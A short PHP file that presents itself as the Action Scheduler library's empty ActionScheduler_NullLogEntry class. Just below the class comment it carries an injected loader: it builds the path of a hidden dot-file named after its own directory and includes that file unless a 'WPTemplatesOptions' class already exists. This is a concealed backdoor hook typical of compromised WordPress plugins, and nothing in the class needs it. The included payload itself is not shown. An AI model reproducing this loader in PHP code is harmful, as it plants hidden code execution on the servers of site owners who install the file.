<?php

/**
 * Class ActionScheduler_NullLogEntry
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ActionScheduler_NullLogEntry extends ActionScheduler_LogEntry {
	public function __construct( $action_id = '', $message = '' ) {
		// nothing to see here
	}
}
 